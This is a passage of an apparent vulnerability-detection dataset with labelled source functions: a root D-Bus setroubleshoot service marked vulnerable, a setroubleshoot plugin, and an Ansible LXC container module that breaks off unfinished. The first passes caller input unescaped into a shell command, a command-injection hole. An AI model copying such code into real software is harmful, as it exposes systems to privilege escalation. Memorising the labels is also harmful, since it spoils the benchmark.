{"idx": 1068, "func": "#!/usr/bin/python\n\nimport dbus\nimport dbus.service\nimport dbus.mainloop.glib\nimport gobject\nimport slip.dbus.service\nfrom slip.dbus import polkit\nimport os\nclass RunFix(slip.dbus.service.Object):\n    default_polkit_auth_required = \"org.fedoraproject.setroubleshootfixit.write\"\n    def __init__ (self, *p, **k):\n        super(RunFix, self).__init__(*p, **k)\n        \n    @dbus.service.method (\"org.fedoraproject.SetroubleshootFixit\", in_signature='ss', out_signature='s')\n    def run_fix(self, local_id, analysis_id):\n        import commands\n        command = \"sealert -f %s -P %s\" % ( local_id, analysis_id)\n        return commands.getoutput(command)\n\nif __name__ == \"__main__\":\n    mainloop = gobject.MainLoop ()\n    dbus.mainloop.glib.DBusGMainLoop (set_as_default=True)\n    system_bus = dbus.SystemBus ()\n    name = dbus.service.BusName(\"org.fedoraproject.SetroubleshootFixit\", system_bus)\n    object = RunFix(system_bus, \"/org/fedoraproject/SetroubleshootFixit/object\")\n    slip.dbus.service.set_mainloop (mainloop)\n    mainloop.run ()\n", "target": 1}
{"idx": 1069, "func": "#\n# Copyright (C) 2006-2011 Red Hat, Inc.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.\n#\n\nimport selinux\nfrom stat import *\nimport gettext\ntranslation=gettext.translation('setroubleshoot-plugins', fallback=True)\n_=translation.gettext\n\nfrom setroubleshoot.util import *\nfrom setroubleshoot.Plugin import Plugin\n\nclass plugin(Plugin):\n    summary =_('''\n    SELinux is preventing $SOURCE_PATH from loading $TARGET_PATH which requires text relocation.\n    ''')\n    \n    problem_description = _('''\n    The $SOURCE application attempted to load $TARGET_PATH which\n    requires text relocation.  This is a potential security problem.\n    Most libraries do not need this permission. Libraries are\n    sometimes coded incorrectly and request this permission.  The\n    <a href=\"http://people.redhat.com/drepper/selinux-mem.html\">SELinux Memory Protection Tests</a>\n    web page explains how to remove this requirement.  You can configure\n    SELinux temporarily to allow $TARGET_PATH to use relocation as a\n    workaround, until the library is fixed. Please file a \nbug report.\n    ''')\n    \n    unsafe_problem_description = _('''\n    The $SOURCE application attempted to load $TARGET_PATH which\n    requires text relocation.  This is a potential security problem.\n    Most libraries should not need this permission.   The   \n    <a href=\"http://people.redhat.com/drepper/selinux-mem.html\">\n    SELinux Memory Protection Tests</a>\n    web page explains this check.  This tool examined the library and it looks \n    like it was built correctly. So setroubleshoot can not determine if this \n    application is compromized or not.  This could be a serious issue. Your \n    system may very well be compromised.\n\n    Contact your security administrator and report this issue.\n\n    ''')\n    \n    unsafe_fix_description = \"Contact your security administrator and report this issue.\" \n\n    fix_description = _('''\n    If you trust $TARGET_PATH to run correctly, you can change the\n    file context to textrel_shlib_t. \"chcon -t textrel_shlib_t\n    '$TARGET_PATH'\"\n    You must also change the default file context files on the system in order to preserve them even on a full relabel.  \"semanage fcontext -a -t textrel_shlib_t '$FIX_TARGET_PATH'\"\n    \n    ''')\n\n    unsafe_then_text = \"\"\"\nsetroubleshoot examined '$FIX_TARGET_PATH' to make sure it was built correctly, but can not determine if this application has been compromized.  This alert could be a serious issue and your system could be compromised.\n\"\"\"\n    unsafe_do_text = \"Contact your security administrator and report this issue.\" \n\n    then_text = \"You need to change the label on '$FIX_TARGET_PATH'\"\n    do_text = \"\"\"# semanage fcontext -a -t textrel_shlib_t '$FIX_TARGET_PATH'\n# restorecon -v '$FIX_TARGET_PATH'\"\"\"\n\n    def get_then_text(self, avc, args):\n        if len(args) > 0:\n            return self.unsafe_then_text\n        return self.then_text\n\n    def get_do_text(self, avc, args):\n        if len(args) > 0:\n            return self.unsafe_do_text\n        return self.do_text\n\n    def __init__(self):\n        Plugin.__init__(self,__name__)\n        self.set_priority(10)\n\n    def analyze(self, avc):\n        import subprocess\n        if avc.has_any_access_in(['execmod']):\n            # MATCH\n            # from https://docs.python.org/2.7/library/subprocess.html#replacing-shell-pipeline\n            p1 = subprocess.Popen(['eu-readelf', '-d', avc.tpath], stdout=subprocess.PIPE)\n            p2 = subprocess.Popen([\"fgrep\", \"-q\", \"TEXTREL\"], stdin=p1.stdout, stdout=subprocess.PIPE)\n            p1.stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n            p1.wait()\n            p2.wait()\n            if p2.returncode == 1:\n                return self.report((\"unsafe\"))\n\n            mcon = selinux.matchpathcon(avc.tpath.strip('\"'), S_IFREG)[1]\n            if mcon.split(\":\")[2] == \"lib_t\":\n                return self.report()\n        return None\n", "target": 0}
{"idx": 1070, "func": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\n# (c) 2014, Kevin Carter <kevin.carter@rackspace.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n\nDOCUMENTATION = \"\"\"\n---\nmodule: lxc_container\nshort_description: Manage LXC Containers\nversion_added: 1.8.0\ndescription:\n  - Management of LXC containers\nauthor: \"Kevin Carter (@cloudnull)\"\noptions:\n    name:\n        description:\n          - Name of a container.\n        required: true\n    backing_store:\n        choices:\n          - dir\n          - lvm\n          - loop\n          - btrfs\n          - overlayfs\n          - zfs\n        description:\n          - Backend storage type for the container.\n        required: false\n        default: dir\n    template:\n        description:\n          - Name of the template to use within an LXC create.\n        required: false\n        default: ubuntu\n    template_options:\n        description:\n          - Template options when building the container.\n        required: false\n    config:\n        description:\n          - Path to the LXC configuration file.\n        required: false\n        default: null\n    lv_name:\n        description:\n          - Name of the logical volume, defaults to the container name.\n        default: $CONTAINER_NAME\n        required: false\n    vg_name:\n        description:\n          - If Backend store is lvm, specify the name of the volume group.\n        default: lxc\n        required: false\n    thinpool:\n        description:\n          - Use LVM thin pool called TP.\n        required: false\n    fs_type:\n        description:\n          - Create fstype TYPE.\n        default: ext4\n        required: false\n    fs_size:\n        description:\n          - File system Size.\n        default: 5G\n        required: false\n    directory:\n        description:\n          - Place rootfs directory under DIR.\n        required: false\n    zfs_root:\n        description:\n          - Create zfs under given zfsroot.\n        required: false\n    container_command:\n        description:\n          - Run a command within a container.\n        required: false\n    lxc_path:\n        description:\n          - Place container under PATH\n        required: false\n    container_log:\n        choices:\n          - true\n          - false\n        description:\n          - Enable a container log for host actions to the container.\n        default: false\n    container_log_level:\n        choices:\n          - INFO\n          - ERROR\n          - DEBUG\n        description:\n          - Set the log level for a container where *container_log* was set.\n        required: false\n        default: INFO\n    clone_name:\n        version_added: \"2.0\"\n        description:\n          - Name of the new cloned server. This is only used when state is\n            clone.\n        required: false\n        default: false\n    clone_snapshot:\n        version_added: \"2.0\"\n        required: false\n        choices:\n          - true\n          - false\n        description:\n          - Create a snapshot a container when cloning. This is not supported\n            by all container storage backends. Enabling this may fail if the\n            backing store does not support snapshots.\n        default: false\n    archive:\n        choices:\n          - true\n          - false\n        description:\n          - Create an archive of a container. This will create a tarball of the\n            running container.\n        default: false\n    archive_path:\n        description:\n          - Path the save the archived container. If the path does not exist\n            the archive method will attempt to create it.\n        default: null\n    archive_compression:\n        choices:\n          - gzip\n          - bzip2\n          - none\n        description:\n          - Type of compression to use when creating an archive of a running\n            container.\n        default: gzip\n    state:\n        choices:\n          - started\n          - stopped\n          - restarted\n          - absent\n          - frozen\n        description:\n          - Define the state of a container. If you clone a container using\n            `clone_name` the newly cloned container created in a stopped state.\n            The running container will be stopped while the clone operation is\n            happening and upon completion of the clone the original container\n            state will be restored.\n        required: false\n        default: started\n    container_config:\n        description:\n          - list of 'key=value' options to use when configuring a container.\n        required: false\nrequirements:\n  - 'lxc >= 1.0 # OS package'\n  - 'python >= 2.6 # OS Package'\n  - 'lxc-python2 >= 0.1 # PIP Package from https://github.com/lxc/python2-lxc'\nnotes:\n  - Containers must have a unique name. If you attempt to create a container\n    with a name that already exists in the users namespace the module will\n    simply return as \"unchanged\".\n  - The \"container_command\" can be used with any state except \"absent\". If\n    used with state \"stopped\" the container will be \"started\", the command\n    executed, and then the container \"stopped\" again. Likewise if the state\n    is \"stopped\" and the container does not exist it will be first created,\n    \"started\", the command executed, and then \"stopped\". If you use a \"|\"\n    in the variable you can use common script formatting within the variable\n    iteself The \"container_command\" option will always execute as BASH.\n    When using \"container_command\" a log file is created in the /tmp/ directory\n    which contains both stdout and stderr of any command executed.\n  - If \"archive\" is **true** the system will attempt to create a compressed\n    tarball of the running container. The \"archive\" option supports LVM backed\n    containers and will create a snapshot of the running container when\n    creating the archive.\n  - If your distro does not have a package for \"python2-lxc\", which is a\n    requirement for this module, it can be installed from source at\n    \"https://github.com/lxc/python2-lxc\" or installed via pip using the package\n    name lxc-python2.\n\"\"\"\n\nEXAMPLES = \"\"\"\n- name: Create a started container\n  lxc_container:\n    name: test-container-started\n    container_log: true\n    template: ubuntu\n    state: started\n    template_options: --release trusty\n\n- name: Create a stopped container\n  lxc_container:\n    name: test-container-stopped\n    container_log: true\n    template: ubuntu\n    state: stopped\n    template_options: --release trusty\n\n- name: Create a frozen container\n  lxc_container:\n    name: test-container-frozen\n    container_log: true\n    template: ubuntu\n    state: frozen\n    template_options: --release trusty\n    container_command: |\n      echo 'hello world.' | tee /opt/started-frozen\n\n# Create filesystem container, configure it, and archive it, and start it.\n- name: Create filesystem container\n  lxc_container:\n    name: test-container-config\n    backing_store: dir\n    container_log: true\n    template: ubuntu\n    state: started\n    archive: true\n    archive_compression: none\n    container_config:\n      - \"lxc.aa_profile=unconfined\"\n      - \"lxc.cgroup.devices.allow=a *:* rmw\"\n    template_options: --release trusty\n\n# Create an lvm container, run a complex command in it, add additional\n# configuration to it, create an archive of it, and finally leave the container\n# in a frozen state. The container archive will be compressed using bzip2\n- name: Create a frozen lvm container\n  lxc_container:\n    name: test-container-lvm\n    container_log: true\n    template: ubuntu\n    state: frozen\n    backing_store: lvm\n    template_options: --release trusty\n    container_command: |\n      apt-get update\n      apt-get install -y vim lxc-dev\n      echo 'hello world.' | tee /opt/started\n      if [[ -f \"/opt/started\" ]]; then\n          echo 'hello world.' | tee /opt/found-started\n      fi\n    container_config:\n      - \"lxc.aa_profile=unconfined\"\n      - \"lxc.cgroup.devices.allow=a *:* rmw\"\n    archive: true\n    archive_compression: bzip2\n  register: lvm_container_info\n\n- name: Debug info on container \"test-container-lvm\"\n  debug: var=lvm_container_info\n\n- name: Run a command in a container and ensure its in a \"stopped\" state.\n  lxc_container:\n    name: test-container-started\n    state: stopped\n    container_command: |\n      echo 'hello world.' | tee /opt/stopped\n\n- name: Run a command in a container and ensure its it in a \"frozen\" state.\n  lxc_container:\n    name: test-container-stopped\n    state: frozen\n    container_command: |\n      echo 'hello world.' | tee /opt/frozen\n\n- name: Start a container\n  lxc_container:\n    name: test-container-stopped\n    state: started\n\n- name: Run a command in a container and then restart it\n  lxc_container:\n    name: test-container-started\n    state: restarted\n    container_command: |\n      echo 'hello world.' | tee /opt/restarted\n\n- name: Run a complex command within a \"running\" container\n  lxc_container:\n    name: test-container-started\n    container_command: |\n      apt-get update\n      apt-get install -y curl wget vim apache2\n      echo 'hello world.' | tee /opt/started\n      if [[ -f \"/opt/started\" ]]; then\n          echo 'hello world.' | tee /opt/found-started\n      fi\n\n# Create an archive of an existing container, save the archive to a defined\n# path and then destroy it.\n- name: Archive container\n  lxc_container:\n    name: test-container-started\n    state: absent\n    archive: true\n    archive_path: /opt/archives\n\n# Create a container using overlayfs, create an archive of it, create a\n# snapshot clone of the container and and finally leave the container\n# in a frozen state. The container archive will be compressed using gzip.\n- name: Create an overlayfs container archive and clone it\n  lxc_container:\n    name: test-container-overlayfs\n    container_log: true\n    template: ubuntu\n    state: started\n    backing_store: overlayfs\n    template_options: --release trusty\n    clone_snapshot: true\n    clone_name: test-container-overlayfs-clone-snapshot\n    archive: true\n    archive_compression: gzip\n  register: clone_container_info\n\n- name: debug info on container \"test-container\"\n  debug: var=clone_container_info\n\n- name: Clone a container using snapshot\n  lxc_container:\n    name: test-container-overlayfs-clone-snapshot\n    backing_store: overlayfs\n    clone_name: test-container-overlayfs-clone-snapshot2\n    clone_snapshot: true\n\n- name: Create a new container and clone it\n  lxc_container:\n    name: test-container-new-archive\n    backing_store: dir\n    clone_name: test-container-new-archive-clone\n\n- name: Archive and clone a container then destroy it\n  lxc_container:\n    name: test-container-new-archive\n    state: absent\n    clone_name: test-container-new-archive-destroyed-clone\n    archive: true\n    archive_compression: gzip\n\n- name: Start a cloned container.\n  lxc_container:\n    name: test-container-new-archive-destroyed-clone\n    state: started\n\n- name: Destroy a container\n  lxc_container:\n    name: \"{{ item }}\"\n    state: absent\n  with_items:\n    - test-container-stopped\n    - test-container-started\n    - test-container-frozen\n    - test-container-lvm\n    - test-container-config\n    - test-container-overlayfs\n    - test-container-overlayfs-clone\n    - test-container-overlayfs-clone-snapshot\n    - test-container-overlayfs-clone-snapshot2\n    - test-container-new-archive\n    - test-container-new-archive-clone\n    - test-container-new-archive-destroyed-clone\n\"\"\"\n\nRETURN=\"\"\"\nlxc_container:\n    description: container information\n    returned: success\n    type: list\n    contains:\n        name:\n            description: name of the lxc container\n            returned: success\n            type: string\n            sample: test_host\n        init_pid:\n            description: pid of the lxc init process\n            returned: success\n            type: int\n            sample: 19786\n        interfaces:\n            description: list of the container's network interfaces\n            returned: success\n            type: list\n            sample: [ \"eth0\", \"lo\" ]\n        ips:\n            description: list of ips\n            returned: success\n            type: list\n            sample: [ \"10.0.3.3\" ]\n        state:\n            description: resulting state of the container\n            returned: success\n            type: string\n            sample: \"running\"\n        archive:\n            description: resulting state of the container\n            returned: success, when archive is true\n            type: string\n            sample: \"/tmp/test-container-config.tar\"\n        clone:\n            description: if the container was cloned\n            returned: success, when clone_name is specified\n            type: boolean\n            sample: True\n\"\"\"\n\ntry:\n    import lxc\nexcept ImportError:\n    HAS_LXC = False\nelse:\n    HAS_LXC = True\n\n\n# LXC_COMPRESSION_MAP is a map of available compression types when creating\n# an archive of a container.\nLXC_COMPRESSION_MAP = {\n    'gzip': {\n        'extension': 'tar.tgz',\n        'argument': '-czf'\n    },\n    'bzip2': {\n        'extension': 'tar.bz2',\n        'argument': '-cjf'\n    },\n    'none': {\n        'extension': 'tar',\n        'argument': '-cf'\n    }\n}\n\n\n# LXC_COMMAND_MAP is a map of variables that are available to a method based\n# on the state the container is in.\nLXC_COMMAND_MAP = {\n    'create': {\n        'variables': {\n            'config': '--config',\n            'template': '--template',\n            'backing_store': '--bdev',\n            'lxc_path': '--lxcpath',\n            'lv_name': '--lvname',\n            'vg_name': '--vgname',\n            'thinpool': '--thinpool',\n            'fs_type': '--fstype',\n            'fs_size': '--fssize',\n            'directory': '--dir',\n            'zfs_root': '--zfsroot'\n        }\n    },\n    'clone': {\n        'variables': {\n            'backing_store': '--backingstore',\n            'lxc_path': '--lxcpath',\n            'fs_size': '--fssize',\n            'name': '--orig',\n            'clone_name': '--new'\n        }\n    }\n}\n\n\n# LXC_BACKING_STORE is a map of available storage backends and options that\n# are incompatible with the given storage backend.\nLXC_BACKING_STORE = {\n    'dir': [\n        'lv_name', 'vg_name', 'fs_type', 'fs_size', 'thinpool'\n    ],\n    'lvm': [\n        'zfs_root'\n    ],\n    'btrfs': [\n        'lv_name', 'vg_name', 'thinpool', 'zfs_root', 'fs_type', 'fs_size'\n    ],\n    'loop': [\n        'lv_name', 'vg_name', 'thinpool', 'zfs_root'\n    ],\n    'overlayfs': [\n        'lv_name', 'vg_name', 'fs_type', 'fs_size', 'thinpool', 'zfs_root'\n    ],\n    'zfs': [\n        'lv_name', 'vg_name', 'fs_type', 'fs_size', 'thinpool'\n    ]\n}\n\n\n# LXC_LOGGING_LEVELS is a map of available log levels\nLXC_LOGGING_LEVELS = {\n    'INFO': ['info', 'INFO', 'Info'],\n    'ERROR': ['error', 'ERROR', 'Error'],\n    'DEBUG': ['debug', 'DEBUG', 'Debug']\n}\n\n\n# LXC_ANSIBLE_STATES is a map of states that contain values of methods used\n# when a particular state is evoked.\nLXC_ANSIBLE_STATES = {\n    'started': '_started',\n    'stopped': '_stopped',\n    'restarted': '_restarted',\n    'absent': '_destroyed',\n    'frozen': '_frozen',\n    'clone': '_clone'\n}\n\n\n# This is used to attach to a running container and execute commands from\n# within the container on the host.  This will provide local access to a\n# container without using SSH.  The template will attempt to work within the\n# home directory of the user that was attached to the container and source\n# that users environment variables by default.\nATTACH_TEMPLATE = \"\"\"#!/usr/bin/env bash\npushd \"$(getent passwd $(whoami)|cut -f6 -d':')\"\n    if [[ -f \".bashrc\" ]];then\n        source .bashrc\n    fi\npopd\n\n# User defined command\n%(container_command)s\n\"\"\"\n\n\ndef create_script(command):\n    \"\"\"Write out a script onto a target.\n\n    This method should be backward compatible with Python 2.4+ when executing\n    from within the container.\n\n    :param command: command to run, this can be a script and can use spacing\n                    with newlines as separation.\n    :type command: ``str``\n    \"\"\"\n\n    import os\n    import os.path as path\n    import subprocess\n    import tempfile\n\n    (fd, script_file) = tempfile.mkstemp(prefix='lxc-attach-script')\n    f = os.fdopen(fd, 'wb')\n    try:\n        f.write(ATTACH_TEMPLATE % {'container_command': command})\n        f.flush()\n    finally:\n        f.close()\n\n    # Ensure the script is executable.\n    os.chmod(script_file, 0700)\n\n    # Output log file.\n    stdout_file = os.fdopen(tempfile.mkstemp(prefix='lxc-attach-script-log')[0], 'ab')\n\n    # Error log file.\n    stderr_file = os.fdopen(tempfile.mkstemp(prefix='lxc-attach-script-err')[0], 'ab')\n\n    # Execute the script command.\n    try:\n        subprocess.Popen(\n            [script_file],\n            stdout=stdout_file,\n            stderr=stderr_file\n        ).communicate()\n    finally:\n        # Close the log files.\n        stderr_file.close()\n        stdout_file.close()\n\n        # Remove the script file upon completion of execution.\n        os.remove(script_file)\n\n\nclass LxcContainerManagement(object):\n    def __init__(self, module):\n        \"\"\"Management of LXC containers via Ansible.\n\n        :param module: Processed Ansible Module.\n        :type module: ``object``\n        \"\"\"\n        self.module = module\n        self.state = self.module.params.get('state', None)\n        self.state_change = False\n        self.lxc_vg = None\n        self.container_name = self.module.params['name']\n        self.container = self.get_container_bind()\n        self.archive_info = None\n        self.clone_info = None\n\n    def get_container_bind(self):\n        return lxc.Container(name=self.container_name)\n\n    @staticmethod\n    def _roundup(num):\n        \"\"\"Return a rounded floating point number.\n\n        :param num: Number to round up.\n        :type: ``float``\n        :returns: Rounded up number.\n        :rtype: ``int``\n        \"\"\"\n        num, part = str(num).split('.')\n        num = int(num)\n        if int(part) != 0:\n            num += 1\n        return num\n\n    @staticmethod\n    def _container_exists(container_name):\n        \"\"\"Check if a container exists.\n\n        :param container_name: Name of the container.\n        :type: ``str``\n        :returns: True or False if the container is found.\n        :rtype: ``bol``\n        \"\"\"\n        if [i for i in lxc.list_containers() if i == container_name]:\n            return True\n        else:\n            return False\n\n    @staticmethod\n    def _add_variables(variables_dict, build_command):\n        \"\"\"Return a command list with all found options.\n\n        :param variables_dict: Pre-parsed optional variables used from a\n                               seed command.\n        :type variables_dict: ``dict``\n        :param build_command: Command to run.\n        :type build_command: ``list``\n        :returns: list of command options.\n        :rtype: ``list``\n        \"\"\"\n\n        for key, value in variables_dict.items():\n            build_command.append(\n                '%s %s' % (key, value)\n            )\n        else:\n            return build_command\n\n    def _get_vars(self, variables):\n        \"\"\"Return a dict of all variables as found within the module.\n\n        :param variables: Hash of all variables to find.\n        :type variables: ``dict``\n        \"\"\"\n\n        # Remove incompatible storage backend options.\n        variables = variables.copy()\n        for v in LXC_BACKING_STORE[self.module.params['backing_store']]:\n            variables.pop(v, None)\n\n        return_dict = dict()\n        false_values = [None, ''] + BOOLEANS_FALSE\n        for k, v in variables.items():\n            _var = self.module.params.get(k)\n            if _var not in false_values:\n                return_dict[v] = _var\n        else:\n            return return_dict\n\n    def _run_command(self, build_command, unsafe_shell=False, timeout=600):\n        \"\"\"Return information from running an Ansible Command.\n\n        This will squash the build command list into a string and then\n        execute the command via Ansible. The output is returned to the method.\n        This output is returned as `return_code`, `stdout`, `stderr`.\n\n        Prior to running the command the method will look to see if the LXC\n        lockfile is present. If the lockfile \"/var/lock/subsys/lxc\" the method\n        will wait upto 10 minutes for it to be gone; polling every 5 seconds.\n\n        :param build_command: Used for the command and all options.\n        :type build_command: ``list``\n        :param unsafe_shell: Enable or Disable unsafe sell commands.\n        :type unsafe_shell: ``bol``\n        :param timeout: Time before the container create process quites.\n        :type timeout: ``int``\n        \"\"\"\n\n        lockfile = '/var/lock/subsys/lxc'\n\n        for _ in xrange(timeout):\n            if os.path.exists(lockfile):\n                time.sleep(1)\n            else:\n                return self.module.run_command(\n                    ' '.join(build_command),\n                    use_unsafe_shell=unsafe_shell\n                )\n        else:\n            message = (\n                'The LXC subsystem is locked and after 5 minutes it never'\n                ' became unlocked. Lockfile [ %s ]' % lockfile\n            )\n            self.failure(\n                error='LXC subsystem locked',\n                rc=0,\n                msg=message\n            )\n\n    def _config(self):\n        \"\"\"Configure an LXC container.\n\n        Write new configuration values to the lxc config file. This will\n        stop the container if it's running write the new options and then\n        restart the container upon completion.\n        \"\"\"\n\n        _container_config = self.module.params.get('container_config')\n        if not _container_config:\n            return False\n\n        container_config_file = self.container.config_file_name\n        with open(container_config_file, 'rb') as f:\n            container_config = f.readlines()\n\n        # Note used ast literal_eval because AnsibleModule does not provide for\n        # adequate dictionary parsing.\n        # Issue: https://github.com/ansible/ansible/issues/7679\n        # TODO(cloudnull) adjust import when issue has been resolved.\n        import ast\n        options_dict = ast.literal_eval(_container_config)\n        parsed_options = [i.split('=', 1) for i in options_dict]\n\n        config_change = False\n        for key, value in parsed_options:\n            new_entry = '%s = %s\\n' % (key, value)\n            for option_line in container_config:\n                # Look for key in config\n                if option_line.startswith(key):\n                    _, _value = option_line.split('=', 1)\n                    config_value = ' '.join(_value.split())\n                    line_index = container_config.index(option_line)\n                    # If the sanitized values don't match replace them\n                    if value != config_value:\n                        line_index += 1\n                        if new_entry not in container_config:\n                            config_change = True\n                            container_config.insert(line_index, new_entry)\n                    # Break the flow as values are written or not at this point\n                    break\n            else:\n                config_change = True\n                container_config.append(new_entry)\n\n        # If the config changed restart the container.\n        if config_change:\n            container_state = self._get_state()\n            if container_state != 'stopped':\n                self.container.stop()\n\n            with open(container_config_file, 'wb') as f:\n                f.writelines(container_config)\n\n            self.state_change = True\n            if container_state == 'running':\n                self._container_startup()\n            elif container_state == 'frozen':\n                self._container_startup()\n                self.container.freeze()\n\n    def _container_create_clone(self):\n        \"\"\"Clone a new LXC container from an existing container.\n\n        This method will clone an existing container to a new container using\n        the `clone_name` variable as the new container name. The method will\n        create a container if the container `name` does not exist.\n\n        Note that cloning a container will ensure that the original container\n        is \"stopped\" before the clone can be done. Because this operation can\n        require a state change the method will return the original container\n        to its prior state upon completion of the clone.\n\n        Once the clone is complete the new container will be left in a stopped\n        state.\n        \"\"\"\n\n        # Ensure that the state of the original container is stopped\n        container_state = self._get_state()\n        if container_state != 'stopped':\n            self.state_change = True\n            self.container.stop()\n\n        build_command = [\n            self.module.get_bin_path('lxc-clone', True),\n        ]\n\n        build_command = self._add_variables(\n            variables_dict=self._get_vars(\n                variables=LXC_COMMAND_MAP['clone']['variables']\n            ),\n            build_command=build_command\n        )\n\n        # Load logging for the instance when creating it.\n        if self.module.params.get('clone_snapshot') in BOOLEANS_TRUE:\n            build_command.append('--snapshot')\n        # Check for backing_store == overlayfs if so force the use of snapshot\n        # If overlay fs is used and snapshot is unset the clone command will\n        # fail with an unsupported type.\n        elif self.module.params.get('backing_store') == 'overlayfs':\n            build_command.append('--snapshot')\n\n        rc, return_data, err = self._run_command(build_command)\n        if rc != 0:\n            message = \"Failed executing lxc-clone.\"\n            self.failure(\n                err=err, rc=rc, msg=message, command=' '.join(\n                    build_command\n                )\n            )\n        else:\n            self.state_change = True\n            # Restore the original state of the origin container if it was\n            # not in a stopped state.\n            if container_state == 'running':\n                self.container.start()\n            elif container_state == 'frozen':\n                self.container.start()\n                self.container.freeze()\n\n        return True\n\n    def _create(self):\n        \"\"\"Create a new LXC container.\n\n        This method will build and execute a shell command to build the\n        container. It would have been nice to simply use the lxc python library\n        however at the time this was written the python library, in both py2\n        and py3 didn't support some of the more advanced container create\n        processes. These missing processes mainly revolve around backing\n        LXC containers with block devices.\n        \"\"\"\n\n        build_command = [\n            self.module.get_bin_path('lxc-create', True),\n            '--name %s' % self.container_name,\n            '--quiet'\n        ]\n\n        build_command = self._add_variables(\n            variables_dict=self._get_vars(\n                variables=LXC_COMMAND_MAP['create']['variables']\n            ),\n            build_command=build_command\n        )\n\n        # Load logging for the instance when creating it.\n        if self.module.params.get('container_log') in BOOLEANS_TRUE:\n            # Set the logging path to the /var/log/lxc if uid is root. else\n            # set it to the home folder of the user executing.\n            try:\n                if os.getuid() != 0:\n                    log_path = os.getenv('HOME')\n                else:\n                    if not os.path.isdir('/var/log/lxc/'):\n                        os.makedirs('/var/log/lxc/')\n                    log_path = '/var/log/lxc/'\n            except OSError:\n                log_path = os.getenv('HOME')\n\n            build_command.extend([\n                '--logfile %s' % os.path.join(\n                    log_path, 'lxc-%s.log' % self.container_name\n                ),\n                '--logpriority %s' % self.module.params.get(\n                    'container_log_level'\n                ).upper()\n            ])\n\n        # Add the template commands to the end of the command if there are any\n        template_options = self.module.params.get('template_options', None)\n        if template_options:\n            build_command.append('-- %s' % template_options)\n\n        rc, return_data, err = self._run_command(build_command)\n        if rc != 0:\n            message = \"Failed executing lxc-create.\"\n            self.failure(\n                err=err, rc=rc, msg=message, command=' '.join(build_command)\n            )\n        else:\n            self.state_change = True\n\n    def _container_data(self):\n        \"\"\"Returns a dict of container information.\n\n        :returns: container data\n        :rtype: ``dict``\n        \"\"\"\n\n        return {\n            'interfaces': self.container.get_interfaces(),\n            'ips': self.container.get_ips(),\n            'state': self._get_state(),\n            'init_pid': int(self.container.init_pid),\n            'name' : self.container_name,\n        }\n\n    def _unfreeze(self):\n        \"\"\"Unfreeze a container.\n\n        :returns: True or False based on if the container was unfrozen.\n        :rtype: ``bol``\n        \"\"\"\n\n        unfreeze = self.container.unfreeze()\n        if unfreeze:\n            self.state_change = True\n        return unfreeze\n\n    def _get_state(self):\n        \"\"\"Return the state of a container.\n\n        If the container is not found the state returned is \"absent\"\n\n        :returns: state of a container as a lower case string.\n        :rtype: ``str``\n        \"\"\"\n\n        if self._container_exists(container_name=self.container_name):\n            return str(self.container.state).lower()\n        else:\n            return str('absent')\n\n    def _execute_command(self):\n        \"\"\"Execute a shell command.\"\"\"\n\n        container_command = self.module.params.get('container_command')\n        if container_command:\n            container_state = self._get_state()\n            if container_state == 'frozen':\n                self._unfreeze()\n            elif container_state == 'stopped':\n                self._container_startup()\n\n            self.container.attach_wait(create_script, container_command)\n            self.state_change = True\n\n    def _container_startup(self, timeout=60):\n        \"\"\"Ensure a container is started.\n\n        :param timeout: Time before the destroy operation is abandoned.\n        :type timeout: ``int``\n        \"\"\"\n\n        self.container = self.get_container_bind()\n        for _ in xrange(timeout):\n            if self._get_state() != 'running':\n                self.container.start()\n                self.state_change = True\n                # post startup sleep for 1 second.\n                time.sleep(1)\n            else:\n                return True\n        else:\n            self.failure(\n                lxc_container=self._container_data(),\n                error='Failed to start container'\n                      ' [ %s ]' % self.container_name,\n                rc=1,\n                msg='The container [ %s ] failed to start. Check to lxc is'\n                    ' available and that the container is in a functional'\n                    ' state.' % self.container_name\n            )\n\n    def _check_archive(self):\n        \"\"\"Create a compressed archive of a container.\n\n        This will store archive_info in as self.archive_info\n        \"\"\"\n\n        if self.module.params.get('archive') in BOOLEANS_TRUE:\n            self.archive_info = {\n                'archive': self._container_create_tar()\n            }\n\n    def _check_clone(self):\n        \"\"\"Create a compressed archive of a container.\n\n        This will store archive_info in as self.archive_info\n        \"\"\"\n\n        clone_name = self.module.params.get('clone_name')\n        if clone_name:\n            if not self._container_exists(container_name=clone_name):\n                self.clone_info = {\n                    'cloned': self._container_create_clone()\n                }\n            else:\n                self.clone_info = {\n                    'cloned': False\n                }\n\n    def _destroyed(self, timeout=60):\n        \"\"\"Ensure a container is destroyed.\n\n        :param timeout: Time before the destroy operation is abandoned.\n        :type timeout: ``int``\n        \"\"\"\n\n        for _ in xrange(timeout):\n            if not self._container_exists(container_name=self.container_name):\n                break\n\n            # Check if the container needs to have an archive created.\n            self._check_archive()\n\n            # Check if the container is to be cloned\n            self._check_clone()\n\n            if self._get_state() != 'stopped':\n                self.state_change = True\n                self.container.stop()\n\n            if self.container.destroy():\n                self.state_change = True\n\n            # post destroy attempt sleep for 1 second.\n            time.sleep(1)\n        else:\n            self.failure(\n                lxc_container=self._container_data(),\n                error='Failed to destroy container'\n                      ' [ %s ]' % self.container_name,\n                rc=1,\n                msg='The container [ %s ] failed to be destroyed. Check'\n                    ' that lxc is available and that the container is in a'\n                    ' functional state.' % self.container_name\n            )\n\n    def _frozen(self, count=0):\n        \"\"\"Ensure a container is frozen.\n\n        If the container does not exist the container will be created.\n\n        :param count: number of times this command has been called by itself.\n        :type count: ``int``\n        \"\"\"\n\n        self.check_count(count=count, 